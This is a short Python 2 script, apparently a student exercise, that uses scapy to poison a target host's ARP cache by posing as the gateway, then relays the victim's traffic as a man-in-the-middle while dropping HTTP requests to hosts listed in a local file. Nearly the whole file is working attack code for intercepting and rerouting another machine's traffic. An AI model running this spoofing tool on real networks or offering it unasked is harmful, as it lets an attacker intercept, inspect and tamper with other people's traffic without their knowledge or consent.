import os,sys,thread
import netifaces as neti
from scapy.all import *

arp_spoof = ARP()
#arp_spoof.

eth = neti.interfaces()[1]

f = open("mal_site.txt","r")
mal_data = f.read().split("\n")

def arp_broadcast(arg_ip): #Get Recever's Mac
    arp_bro = ARP()

    arp_bro.hwsrc = s_mac
    arp_bro.hwdst = "ff:ff:ff:ff:ff:ff"
    arp_bro.psrc = s_ip
    arp_bro.pdst = arg_ip

    packet = sr1(arp_bro)

    return packet[ARP].hwsrc

r_ip = sys.argv[1]
r_ip = sys.argv[1]
g_ip = neti.gateways()[neti.AF_INET][0][0]
s_ip = neti.ifaddresses(eth)[neti.AF_INET][0]['addr']
s_mac = neti.ifaddresses(eth)[neti.AF_LINK][0]['addr']
r_mac = arp_broadcast(r_ip)
g_mac = arp_broadcast(g_ip)

def arp_spoofing(): #Attack
    arp_spoof.hwsrc = s_mac
    arp_spoof.hwdst = r_mac
    arp_spoof.psrc = g_ip
    arp_spoof.pdst = r_ip

    send(arp_spoof)
    print "[+] ARP Spoofing is Done!"

def packet_filter(packet):
    if str(packet).find("HTTP")!=-1:
        for mal_url in mal_data:
            if mal_url == "": continue
            mal_url = mal_url.replace("http://","").replace("https://","")
            if str(packet).find("Host: "+mal_url)!=-1:
                print mal_url + " -- Detected !!!!"
                return 0

    return 1

def packet_relay(packet): #Packet Relay
    if (packet[IP].src == sys.argv[1] and packet[Ether].dst == s_mac):
        if str(packet).find("HTTP")!=-1:
            if packet_filter(packet)==0:
                return 0
        if packet[Ether].src == r_mac:
            packet[Ether].dst = g_mac
            packet[Ether].src = s_mac
            sendp(packet)
        elif packet[IP].dst == r_ip:
            packet[Ether].src = s_mac
            packet[Ether].dst = r_mac
            sendp(packet)
        print "[+] Packet Forwarding..."

def main():
    arp_spoofing()

    while(1): #arp_spoofing attack after 50th sniffing
        sniff(prn=packet_relay,filter="ip", store=0, count=50)
        arp_spoofing()

if __name__ == '__main__':
    main()
